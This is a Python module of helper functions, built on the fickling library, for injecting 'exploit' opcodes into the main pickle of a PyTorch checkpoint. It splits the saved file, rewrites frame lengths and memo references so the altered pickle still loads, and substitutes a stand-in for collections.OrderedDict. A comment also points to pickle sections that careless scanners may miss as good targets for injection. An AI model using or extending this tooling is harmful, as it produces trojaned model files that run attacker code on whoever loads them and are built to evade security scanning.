# pylint: disable=redefined-builtin,unspecified-encoding
import io
import pickle
import pickletools as pt
from struct import pack, unpack
from typing import Any, Iterable, Optional, TypeVar
import torch
from fickling import pickle as p
from fickling.pickle import Pickled

Opcodes = list[p.Opcode]
T = TypeVar("T")


def get(memo_index: int) -> p.BinGet | p.LongBinGet:
    if memo_index < 256:
        return p.BinGet(data=pickle.BINGET + pack("<B", memo_index))
    return p.LongBinGet(data=pickle.LONG_BINGET + pack("<I", memo_index))


class Variables:
    "human names for memory indexes"

    def __init__(self, counter_start: int = 0):
        self.memory_counter = counter_start
        self.varname_counter = 0
        self.memo_indexes: dict[str, int] = {}
        self.ids: dict[str, str] = {}

    def add(self, memo: T, name: str, id: Optional[str] = None) -> T:
        self.memo_indexes[name] = self.memory_counter
        self.memory_counter += 1
        if id:
            self.ids[id] = name
        else:
            self.ids[f"_var{self.varname_counter}"] = name
            self.varname_counter += 1
        return memo

    def __getitem__(self, name: str) -> p.BinGet | p.LongBinGet:
        memo_index = self.memo_indexes[name]
        return get(memo_index)

    # should be used for show in debugger but whatever
    def gloss(self, varname: str) -> str:
        return self.ids[varname]


def find_main_pickle(ckpt: str | Any) -> tuple[bytes, bytes, bytes]:
    if isinstance(ckpt, str):
        model = torch.load(ckpt)
    else:
        model = ckpt
    buf = io.BytesIO()
    # we want protocol 4 and none of the zipfile stuff
    # that said fickling has an example of how to use zipfiles
    torch.save(model, buf, _use_new_zipfile_serialization=False, pickle_protocol=4)
    buf.seek(0)
    # a torch.save is:
    # 1. magic number
    # 2. protocol version
    # 3. sys info
    # 4. real obj (persistent id) / "result" <- fuck here
    # 5. (de)serialized storage keys
    # 6. not pickle data, read by THPStorage_setFromFile to set storages from these

    # let's find the right parts of the ckpt
    # pt.dis will read the buffer up until STOP
    # we don't care about the dis, just the indexes
    # discard the first three pickles

    # for reference, a careless scanner might not scan these,
    # they could be good targets
    devnull = open("/dev/null", "w")
    pt.dis(buf, devnull)  # magic number
    pt.dis(buf, devnull)  # protocol version
    pt.dis(buf, devnull)  # sys info

    # figure out where the pickle we want starts/stops
    result_start = buf.tell()
    pt.dis(buf, devnull)
    result_end = buf.tell()
    buf.seek(result_start)
    main_bytes = buf.read(result_end - result_start)  # might be an off by one?

    last_bytes = buf.read()
    buf.seek(0)
    first_bytes = buf.read(result_start)
    return (first_bytes, main_bytes, last_bytes)


def count_ops(ops: Opcodes | Pickled, op_type: type) -> int:
    return len([op for op in ops if isinstance(op, op_type)])


def find_seq(op_types: list[type], pickled: Pickled) -> list[int]:
    def iter() -> Iterable[int]:
        for start in range(len(pickled)):
            try:
                for index, op_type in enumerate(op_types, start=start):
                    assert isinstance(pickled[index], op_type)
                yield start
            except AssertionError:
                pass

    return list(iter())


def change_frame_len(frame: p.Frame, length_change: int) -> p.Frame:
    # pickle targets frames being under 64 * 1024
    # https://github.com/python/cpython/blob/3.9/Lib/pickle.py#L228
    frame_len = unpack("<Q", frame.data[1:])[0]
    frame.data = pickle.FRAME + pack("<Q", frame_len + length_change)
    return frame


# probably too finnicky to really reuse
# need the exploit, the following, the first memo of the exploit, and any memo substitutions
def fix_gets(following: Opcodes, exploit: Opcodes, vars: Variables) -> list[p.Opcode]:
    memos_injected = count_ops(exploit, p.Memoize())
    for fix_i, op in enumerate(following):
        previous_memo_index = None
        # https://github.com/python/cpython/blob/3.9/Lib/pickle.py#L528-L531
        if isinstance(op, p.BinGet):
            previous_memo_index = unpack("<B", op.data[1:])[0]
        elif isinstance(op, p.LongBinGet):
            previous_memo_index = unpack("<I", op.data[1:])[0]
        if previous_memo_index is not None:
            # if it's refering to an early memo, it stays the same
            if previous_memo_index < vars.memo_indexes["getattr"]:
                new_memo_index = previous_memo_index
            # if it's trying to refer to collections.OrderedDict, instead refer to collections._o
            elif previous_memo_index == vars.memo_indexes["getattr"]:
                new_memo_index = vars.memo_indexes["real_OD"]
            # if it's refering to a memo that was shifted, correct that
            else:
                new_memo_index = previous_memo_index + memos_injected

            # new opcode
            new_op = get(new_memo_index)

            # if len(new_op.data) != len(op.data):
            #     print(
            #         f"binget replace {op.data} with {new_data} has different length at op {fix_i} {op}"
            #     )
            following[fix_i] = new_op
    return following
